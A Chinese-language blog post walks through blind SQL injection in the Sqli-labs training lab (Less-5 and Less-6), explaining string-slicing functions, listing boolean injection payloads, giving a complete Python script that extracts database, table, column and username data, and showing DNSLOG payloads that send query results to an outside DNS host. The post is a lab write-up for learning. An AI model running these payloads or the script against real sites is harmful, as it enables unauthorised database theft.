<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/uploads/xzpq.jpg?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Sqli-labs," />










<meta name="description" content="在Sqli-labs项目中的第5、6关是盲注部分。我们知道盲注中,往往会遇到截取字符串的问题,这种情况下往往需要一个一个字符的去猜解,这里就总结几个过程中会用于截取字符串的函数及在Less5、6中的应用。   ##MID(源字符串,开始位置,截取长度)    str = ‘123456’  mid(str,2,1)结果为2 （下标从1开始）SQL用例：A.MID(DATABASE(),1,1)&amp;">
<meta name="keywords" content="Sqli-labs">
<meta property="og:type" content="article">
<meta property="og:title" content="Sqli-labs Blind injection Less5-6">
<meta property="og:url" content="http://yoursite.com/2018/10/23/Sqli-labs_Blind_injection_Less5-6/index.html">
<meta property="og:site_name" content="P0rZ9&#39;s blog">
<meta property="og:description" content="在Sqli-labs项目中的第5、6关是盲注部分。我们知道盲注中,往往会遇到截取字符串的问题,这种情况下往往需要一个一个字符的去猜解,这里就总结几个过程中会用于截取字符串的函数及在Less5、6中的应用。   ##MID(源字符串,开始位置,截取长度)    str = ‘123456’  mid(str,2,1)结果为2 （下标从1开始）SQL用例：A.MID(DATABASE(),1,1)&amp;">
<meta property="og:locale" content="default">
<meta property="og:image" content="http://static.zybuluo.com/chhyx/q6l3mejmpny13ckm3zjr7sue/image_1cqdfvqp21pi71ehd1kou7gs1kgtam.png">
<meta property="og:image" content="http://static.zybuluo.com/chhyx/1c8lqewwtouvcupqlga4at3v/image_1cqdfu64t2avelb1ugdlh61ssca9.png">
<meta property="og:image" content="http://static.zybuluo.com/chhyx/2887km8ounik96ogys2wymx9/image_1cqfqlru4kvm10nj4vh16sl17c19.png">
<meta property="og:image" content="http://static.zybuluo.com/chhyx/2n73z1533r7e7j9spwymv4tt/image_1cqfl19qe1eb21vb11nor1itstknp.png">
<meta property="og:image" content="http://static.zybuluo.com/chhyx/742qe6uxv1qzc8q878jbizq2/image_1cqfsnokf112n1pokbbe1m6mn150.png">
<meta property="og:image" content="http://static.zybuluo.com/chhyx/7833nzrji74ghcfxxqrck3qj/image_1cqfsl3oa1f15uin13p41gcd9j51j.png">
<meta property="og:image" content="http://static.zybuluo.com/chhyx/z4iksin5ba3qjblj36bd7srh/image_1cqftpsuureu1uh18071tcl1djp9e.png">
<meta property="og:image" content="http://static.zybuluo.com/chhyx/6pxiwvjna84pwnrocve6aj8j/image_1cqg1ucob1k9jmbe1emh1iml1nqo9.png">
<meta property="og:image" content="http://static.zybuluo.com/chhyx/1hf0mvtjsayzma47kbr7zuo3/image_1cqg2dqhh1gbj1rpm26q1arr16dm16.png">
<meta property="og:updated_time" content="2018-10-23T09:39:29.561Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Sqli-labs Blind injection Less5-6">
<meta name="twitter:description" content="在Sqli-labs项目中的第5、6关是盲注部分。我们知道盲注中,往往会遇到截取字符串的问题,这种情况下往往需要一个一个字符的去猜解,这里就总结几个过程中会用于截取字符串的函数及在Less5、6中的应用。   ##MID(源字符串,开始位置,截取长度)    str = ‘123456’  mid(str,2,1)结果为2 （下标从1开始）SQL用例：A.MID(DATABASE(),1,1)&amp;">
<meta name="twitter:image" content="http://static.zybuluo.com/chhyx/q6l3mejmpny13ckm3zjr7sue/image_1cqdfvqp21pi71ehd1kou7gs1kgtam.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2018/10/23/Sqli-labs_Blind_injection_Less5-6/"/>





  <title>Sqli-labs Blind injection Less5-6 | P0rZ9's blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">P0rZ9's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
            Archives
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/23/Sqli-labs_Blind_injection_Less5-6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">Sqli-labs Blind injection Less5-6</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-23T08:15:41+08:00">
                2018-10-23
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          
            <span class="post-meta-divider">|</span>
            <span class="page-pv"><i class="fa fa-file-o"></i>
            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
            </span>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <blockquote>
<p>在Sqli-labs项目中的第5、6关是盲注部分。我们知道盲注中,往往会遇到截取字符串的问题,这种情况下往往需要一个一个字符的去猜解,这里就总结几个过程中会用于截取字符串的函数及在Less5、6中的应用。</p>
</blockquote>
<hr>
<p>##<strong>MID(源字符串,开始位置,截取长度)</strong><br>    str = ‘123456’  mid(str,2,1)结果为2 （下标从1开始）<br><strong>SQL用例</strong>：<br>A.<code>MID(DATABASE(),1,1)&gt;&#39;a&#39;</code>,查看数据库名第一位，<code>MID(DATABASE(),2,1)</code>查看数据库名第二位，依次查看各位字符。</p>
<p>B.<code>MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xx LIMIT 0,1),1,1)&gt;&#39;a&#39;</code>这里的源字符串可为sql语句,可自行构造进行注入</p>
<p>##<strong>substr(源字符串,开始位置,截取长度)</strong><br>substr与mid substring的用法类似<br>str = ‘123456’  substr(str,2,1)结果为2 （下标从1开始）<br><strong>SQL用例</strong>：<br>A.<code>substr(DATABASE(),1,1)&gt;&#39;a&#39;</code>,查看数据库名第一位,<code>MID(DATABASE(),2,1)</code>查看数据库名第二位,依次查看各位字符。</p>
<p>B.<code>substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xx LIMIT 0,1),1,1)&gt;&#39;a&#39;</code>这里的源字符串可为sql语句,可自行构造进行注入</p>
<p>##<strong>left(源字符串,截取长度)</strong><br>left得到字符串从左开始指定个数的字符串<br>str = ‘123456’  left(str,3) 结果为123<br><strong>SQL用例</strong>：<br>A.<code>left(database(),1)&gt;&#39;a&#39;</code>,查看数据库名第一位,<code>left(database(),2)&gt;&#39;ab&#39;</code>,查看数据库名前二位。</p>
<p>B.<code>left((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xx LIMIT 0,1),1)&gt;&#39;a&#39;</code>这里的源字符串可为sql语句,可自行构造进行注入</p>
<hr>
<p>再介绍一<code>下ascii()</code>与<code>ord()</code>函数,这两个函数经常与上面的截取函数连用。<br>因为mysql默认是不对大小写敏感的,所以为了保证结果准确,我们就需要将字符转为其对应的ascii码值进行比较</p>
<p>用法:<code>ASCII(str1) ord(str1)</code> 都是返回字符串的第一个字符的ASCII码值</p>
<p><strong>SQL用例</strong>：</p>
<pre><code>猜解数据库名第一位的ascii码值是否为97 (即字符a)
ascii(substr(database(),1,1))=97 
ord(mid(database(),1,1))=97  
</code></pre><p>##<strong>Less-5:</strong><br>经过简单查看页面,这里的正确界面并不会返回用户名与密码,而是返回字符串<code>You are in.....</code><br><img src="http://static.zybuluo.com/chhyx/q6l3mejmpny13ckm3zjr7sue/image_1cqdfvqp21pi71ehd1kou7gs1kgtam.png" alt="image_1cqdfvqp21pi71ehd1kou7gs1kgtam.png-206.3kB"></p>
<p>加单引号看报错信息:<br><img src="http://static.zybuluo.com/chhyx/1c8lqewwtouvcupqlga4at3v/image_1cqdfu64t2avelb1ugdlh61ssca9.png" alt="image_1cqdfu64t2avelb1ugdlh61ssca9.png-212.9kB"></p>
<p>我们可以看到我们提交的1’经过sql语句处理变成<code>&#39;&#39;1&#39;&#39; LIMIT 0,1</code> 所以我们可以猜测后台代码是这样写的:<code>$sql=&quot;select * from users where id=&#39;$id&#39; limit 0,1&quot;</code><br>这里我们就需要闭合掉单引号</p>
<pre><code>http://127.0.0.1:86/less-5/index.php?id=1&apos; and 1=1--+
http://127.0.0.1:86/less-5/index.php?id=1&apos; and 1=2--+
</code></pre><p>这里正确会返回You are in…… 错误返回空</p>
<p>那么基本可以确定这里是一处盲注了,下面笔者直接给出payload,如果有不熟悉的语句,可参考笔者之前的文章:<a href="https://p0rz9.github.io/2018/10/22/Sqli-labs_Less1-4/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/10/22/Sqli-labs_Less1-4/</a></p>
<p>猜解数据库长度:</p>
<pre><code>http://127.0.0.1:86/less-5/index.php?id=1&apos; and length(database())&gt;7--+
http://127.0.0.1:86/less-5/index.php?id=1&apos; and length(database())&gt;8--+
</code></pre><p>说明数据库长度为8</p>
<p>猜解数据库名:</p>
<pre><code>http://127.0.0.1:86/less-5/index.php?id=1&apos; and ascii(substr((database()),1,1))=115--+
</code></pre><p>这里用burp简单测试一下,发现<code>ascii码</code>值为115返回正确页面, 猜解出第一位为s<br><img src="http://static.zybuluo.com/chhyx/2887km8ounik96ogys2wymx9/image_1cqfqlru4kvm10nj4vh16sl17c19.png" alt="image_1cqfqlru4kvm10nj4vh16sl17c19.png-63.9kB"><br>改变<code>substr</code>的第二个参数,至到数据库名全部猜解。（security）</p>
<p>猜解数据表数量:</p>
<pre><code>&apos; and (select count(table_name) from information_schema.tables where table_schema=&apos;security&apos;)=4--+
</code></pre><p>得到security数据库共有4张表<br>猜解每个表的长度:</p>
<pre><code>&apos; and length((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1))=6--+
</code></pre><p>猜解数据表名:</p>
<pre><code>&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1))=97--+
</code></pre><p>猜解列个数:</p>
<pre><code>&apos; and (select count(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos;)=4--+
</code></pre><p>猜解列长度:(改变substr的第二个参数进行猜解)</p>
<pre><code>&apos; and ascii(substr((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos; limit 0,1),1,1))--+
</code></pre><p>猜解列名:</p>
<pre><code>&apos; and ascii(substr((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos; limit 0,1),1,1))=97--+
</code></pre><p>然后就是猜解列中的数据了(这里以username列为例)</p>
<p>猜解<code>username</code>列中的数据量:</p>
<pre><code>&apos; and (select count(username) from security.users)=13--+;
</code></pre><p>猜解<code>username</code>列第一条数据的长度:</p>
<pre><code>&apos; and ascii(substr((select username from security.users limit 0,1),1,1))--+
</code></pre><p>猜解<code>username</code>列第一条数据的长度</p>
<pre><code>&apos; and ascii(substr((select username name from security.users limit 0,1),1,1))=97--+
</code></pre><p>附完整python代码:</p>
<pre><code># -*- coding: utf-8 -*-
#author: P0rZ9
#env: python2 
#fun: Sqli-labs less5

import requests
import string

url = &quot;http://127.0.0.1:86/less-5/index.php?id=1&quot;
str1 = string.letters + string.digits + &quot;_!@#*&quot;

database_name = &quot;&quot;
table_num = 0
table_list = []
column_dic = {}
column_list = []
date_list = []

#猜解数据库长度
print &quot;开始猜解数据库长度......&quot;
for i in range(30):
    payload = &quot;&apos; and length(database())={}--+&quot;.format(str(i))
    re = requests.get(url+payload)
    #print url+payload
    if &apos;You are in...........&apos; in re.text and re.status_code == 200:
        database_length = i
        #print &apos;database_length:%d&apos;%(database_length)
        break
print &quot;数据库长度为%s&quot;%(database_length)
#database_length：8

#猜解数据库名
print &quot;开始猜解数据库名......&quot;
for i in range(1,database_length+1):
    for chr in str1:
        payload = &quot;&apos; and ascii(substr(database(),{},1))={}--+&quot;.format(str(i),ord(chr)) 
        re = requests.get(url+payload)
        #print url+payload
        if &apos;You are in...........&apos; in re.text and re.status_code == 200:
            database_name += chr
            break
        else:
            pass
print &quot;数据库名为%s&quot;%(database_name)
#database_name：security

#猜解数据表个数
print &quot;开始猜解表的数量......&quot;
for i in range(30):
    payload = &quot;&apos; and (select count(table_name) from information_schema.tables where table_schema=&apos;%s&apos;)=%s--+&quot;%(database_name,str(i))
    re = requests.get(url+payload)
    #print url+payload
    if &apos;You are in...........&apos; in re.text and re.status_code == 200:
        table_num = i
        break
    else:
        pass
print &quot;表的数量为:%s&quot;%(str(table_num))
#table_num:4


#表长度及名称
#表长
print &quot;开始猜解表名.......&quot;
for i in range(table_num):
    table_name = &quot;&quot;
    for j in range(10):
        payload = &quot;&apos; and length((select table_name from information_schema.tables where table_schema=&apos;%s&apos; limit %s,1))=%s--+&quot;%(database_name,str(i),str(j))
        re = requests.get(url+payload)
        #print url+payload
        if &apos;You are in...........&apos; in re.text and re.status_code == 200:
            table_len = j
            #print table_len

            #表名
            for k in range(table_len):#6
                for chr in str1:
                    payload = &quot;&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=&apos;%s&apos; limit %s,1),%s,1))=%s--+&quot;%(database_name,str(i),str(k+1),ord(chr))
                    #print url+payload
                    re = requests.get(url+payload)
                    if &apos;You are in...........&apos; in re.text and re.status_code == 200:
                        table_name += chr
                        break
            #print &quot;%s:%s位&quot;%(table_len,table_name)
            table_list.append(table_name)
            break
print table_list
#table_list = [&apos;uagents&apos;,&apos;referers&apos;,&apos;emails&apos;,&apos;users&apos;]


#字段

#猜解列的个数
print &quot;开始猜解%s的列个数&quot;%(table_list[-1])
for i in range(20):
    payload = &quot;&apos; and (select count(column_name) from information_schema.columns where table_schema=&apos;%s&apos; and table_name=&apos;%s&apos;)=%s--+&quot;%(database_name,table_list[-1],str(i))
    re = requests.get(url+payload)
    #print url+payload
    if &apos;You are in...........&apos; in re.text and re.status_code == 200:
        column_num = i
        #print &quot;%s:%s个表&quot;%(table_list[-1],column_num)
        column_dic.setdefault(table_list[-1],column_num)
        break

print &quot;%s的列个数为%s&quot;%(table_list[-1],column_dic[&apos;users&apos;])
#column_dic:{&apos;users&apos;: 3}



#猜解列的长度及列名
print &quot;开始猜解%s的列名......&quot;%(table_list[-1])

for i in range(column_dic[table_list[-1]]):#4
    column_name = &quot;&quot;
    for j in range(20):
        payload = &quot;&apos; and ascii(substr((select column_name from information_schema.columns where table_schema=&apos;%s&apos; and table_name=&apos;%s&apos; limit %s,1),%s,1))--+&quot;%(database_name,table_list[-1],str(i),str(j+1))
        #print url+payload
        re = requests.get(url+payload)

        if &apos;You are in&apos; not in re.text and re.status_code == 200:
            column_len = j
            #print column_len
            for k in range(column_len):
                for chr in str1:
                    payload = &quot;&apos; and ascii(substr((select column_name from information_schema.columns where table_schema=&apos;%s&apos; and table_name=&apos;%s&apos; limit %s,1),%s,1))=%s--+&quot;%(database_name,table_list[-1],str(i),str(k+1),ord(chr))
                    re = requests.get(url+payload)
                    #print url+payload
                    if &apos;You are in...........&apos; in re.text and re.status_code == 200:
                        column_name += chr
                        break

            print column_name
            column_list.append(column_name)
            break
print &quot;%s表有%s字段,分别为:%s&quot;%(table_list[-1],column_dic[table_list[-1]],column_list)
#column_list = [&apos;id&apos;,&apos;username&apos;,&apos;password&apos;]




print &quot;开始猜解%s表的数据量.......&quot;%(table_list[-1])
for i in range(20):
    payload = &quot;&apos; and (select count(%s) from %s)=%s--+;&quot;%(column_list[1],table_list[-1],str(i))
    re = requests.get(url+payload)
    #print url+payload
    if &apos;You are in...........&apos; in re.text and re.status_code == 200:
        data_num = i
        break
print &quot;得到%s表的数据量为%s组&quot;%(table_list[-1],str(data_num))
#data_num:13

print &quot;开始猜解%s表的%s列的数据.......&quot;%(table_list[-1],column_list[1])
for i in range(data_num):
    for j in range(20):
        date_name = &quot;&quot;
        payload = &quot;&apos; and ascii(substr((select %s from %s.%s limit %s,1),%s,1))--+&quot;%(column_list[1],database_name,table_list[-1],str(i),str(j+1))
        re = requests.get(url+payload)
        #print url+payload
        if &apos;You are in...........&apos; not in re.text and re.status_code == 200:

            for k in range(j):  #输入每个字符的长度
                for chr in str1:
                    payload = &quot;&apos; and ascii(substr((select %s name from %s.%s limit %s,1),%s,1))=%s--+&quot;%(column_list[1],database_name,table_list[-1],str(i),str(k+1),str(ord(chr)))
                    re = requests.get(url+payload)
                    #print url+payload
                    if &apos;You are in...........&apos; in re.text and re.status_code == 200:
                        date_name += chr
                        break
            date_list.append(date_name)
            break        
print &quot;%s表的%s列的数据:%s&quot;%(table_list[-1],column_list[1],date_list)
</code></pre><p>运行结果:<br><img src="http://static.zybuluo.com/chhyx/2n73z1533r7e7j9spwymv4tt/image_1cqfl19qe1eb21vb11nor1itstknp.png" alt="image_1cqfl19qe1eb21vb11nor1itstknp.png-101kB"></p>
<p>写这个脚本时主要是为了学习盲注,但是写完发现还有好多可改进的地方,比如没用函数包裹,猜解效率太低(可以考虑使用二分法)。有时间再改吧。</p>
<p>##<strong>Less-6:</strong><br>加单引号<code>&#39;</code>页面无明显返回:<br><img src="http://static.zybuluo.com/chhyx/742qe6uxv1qzc8q878jbizq2/image_1cqfsnokf112n1pokbbe1m6mn150.png" alt="image_1cqfsnokf112n1pokbbe1m6mn150.png-207.4kB"></p>
<p>加个双引号<code>&quot;</code>试试:<br><img src="http://static.zybuluo.com/chhyx/7833nzrji74ghcfxxqrck3qj/image_1cqfsl3oa1f15uin13p41gcd9j51j.png" alt="image_1cqfsl3oa1f15uin13p41gcd9j51j.png-214.6kB"></p>
<p>我们输入的1”变成了’”1”” limit 0,1’ 可发现多了一个双引号 我们注释掉它继续猜解。且我们可猜测后台处理语句为:</p>
<pre><code>$sql=&quot;SELECT * FROM users WHERE id=&quot;$id&quot; LIMIT 0,1&quot;;
</code></pre><p>那我们将Less-5所用payload中的<code>&#39;</code>改为<code>&quot;</code>即可成功利用。</p>
<p><img src="http://static.zybuluo.com/chhyx/z4iksin5ba3qjblj36bd7srh/image_1cqftpsuureu1uh18071tcl1djp9e.png" alt="image_1cqftpsuureu1uh18071tcl1djp9e.png-54.9kB"></p>
<p><strong>DNSLOG注入</strong><br>当然这里也可以使用DNSLOG来盲注,不清楚的可以先看看笔者前几天的文章:<br><a href="https://p0rz9.github.io/2018/09/26/%E5%88%A9%E7%94%A8DNSLOG%E5%BF%AB%E9%80%9F%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%28%E7%9B%B2%E6%B3%A8%29/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/26/利用DNSLOG快速获取数据(盲注)</a></p>
<p>获取数据库名:</p>
<pre><code>id=1&apos; and if((select load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.xxxxx.ceye.io\\abc&apos;))),1,0)--+
</code></pre><p>即可在我们的dns平台查看数据库内容:<br><img src="http://static.zybuluo.com/chhyx/6pxiwvjna84pwnrocve6aj8j/image_1cqg1ucob1k9jmbe1emh1iml1nqo9.png" alt="image_1cqg1ucob1k9jmbe1emh1iml1nqo9.png-46.2kB"></p>
<p>获取表名：</p>
<pre><code>&apos; and if((select load_file(concat(&apos;\\\\&apos;,(select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),&apos;.xxxxx.ceye.io\\abc&apos;))),1,0)--+
</code></pre><p><img src="http://static.zybuluo.com/chhyx/1hf0mvtjsayzma47kbr7zuo3/image_1cqg2dqhh1gbj1rpm26q1arr16dm16.png" alt="image_1cqg2dqhh1gbj1rpm26q1arr16dm16.png-99.1kB"></p>
<p>之后更换我们的SQL语句即可获取数据。这种方式的优点是获取数据快,但是利用的条件相对来说较苛刻。不过在平常的测试中作为一种测试手法还是可以的。</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/Sqli-labs/" rel="tag"># Sqli-labs</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2018/10/22/Sqli-labs_Less1-4/" rel="next" title="Sqli-labs Error Based Sqli Less1-4">
                <i class="fa fa-chevron-left"></i> Sqli-labs Error Based Sqli Less1-4
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2018/10/25/ZZCMSV8.2详细审计/" rel="prev" title="代码审计 | ZZCMSV8.2详细审计">
                代码审计 | ZZCMSV8.2详细审计 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">P0rZ9</p>
              <p class="site-description motion-element" itemprop="description">找回当年那个被寄予厚望的自己</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">39</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">P0rZ9</span>

  
</div>












        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      
    </span>
  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
